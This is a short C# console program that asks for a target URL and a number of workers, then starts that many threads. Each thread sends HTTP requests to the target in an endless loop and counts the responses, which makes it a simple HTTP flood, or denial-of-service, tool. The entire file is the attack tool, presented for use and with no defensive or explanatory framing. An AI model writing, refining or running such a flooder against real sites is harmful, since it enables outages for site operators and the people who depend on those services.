﻿using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

namespace MyTasks
{
    public class Program
    {
        static void Main()
        {
            Console.Write("URL name of TARGET (Example https://www.google.com/): ");
            string url = Console.ReadLine();

            Console.Write("Workers count: ");
            int numOfThreads = Convert.ToInt32(Console.ReadLine());

            int count = 0;

            Parallel.For(0, numOfThreads, (i) =>
            {
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                            ++count;
                            Console.WriteLine(count);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                        }
                    }
                }).Start();
            });
        }
    }
}
